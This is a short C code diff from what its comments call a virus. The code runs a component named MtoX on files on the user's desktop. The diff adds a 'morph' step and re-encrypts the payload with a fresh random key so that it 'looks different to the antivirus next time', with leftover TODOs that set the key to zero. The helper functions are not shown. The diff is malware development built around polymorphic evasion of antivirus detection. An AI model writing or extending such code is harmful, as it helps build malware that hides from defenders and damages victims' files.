@@ -21,7 +21,7 @@ int main(int argc, char*argv[]) {
 	fclose(fp);
 
 	// Decrypt the files needed to run the virus
-	decryptFile(key);
+	decryptFile(key); // TODO probably remove this
 
 	/* 
 		Run MtoX on files on the user's desktop 
@@ -32,14 +32,17 @@ int main(int argc, char*argv[]) {
 		Encrypt File 
 	*/
 	// Generate a new key and put it in the file key.txt
+	srand(time(NULL));
 	key = rand() % 100 + 1; 
+	key = 0; // TODO delete this when ready
 	
 	fp = fopen("key.txt","w");
 	fprintf (fp, "%d", key); 
 	fclose(fp);
 
-	// Encrypt the file MtoX using the key so it looks different to the antivirus next time
-	encryptFile(key);
+	// Encrypt/Morph the file MtoX using the key so it looks different to the antivirus next time
+	morphFile();
+	encryptFile(key);	// TODO probably remove this
 
 	return 0;
 }
